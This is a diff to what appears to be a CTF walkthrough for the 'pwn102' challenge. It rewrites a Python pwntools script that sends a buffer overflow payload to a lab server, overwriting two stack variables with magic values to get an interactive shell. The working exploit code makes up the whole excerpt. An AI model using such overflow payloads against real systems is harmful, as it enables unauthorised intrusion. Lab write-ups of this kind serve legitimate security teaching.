@@ -254,24 +254,21 @@ Let's create a python script to overwrite those variables and get a shell
 ```python
 import sys
 from pwn import *
-from struct import *
 
 exe = './pwn102.pwn102'
 elf = context.binary = ELF(exe, checksec=False)
 
 io = remote("10.10.31.35", 9002)
 
-rbp_8 = pack("<I", 0xc0d3)
-rbp_4 = pack("<I", 0xc0ff33)
+rbp_8 = p32(0xc0d3)
+rbp_4 = p32(0xc0ff33)
 
-payload = flat(
-    asm('nop') * 104,
-    rbp_8,
-    rbp_4
-)
+payload = b'A' * 104
+payload += rbp_8
+payload += rbp_4
 
-write('payload', payload)
-io.sendlineafter(b'?', payload)
+io.sendlineafter(b'? ', payload)
+
 io.interactive()
 ```
 
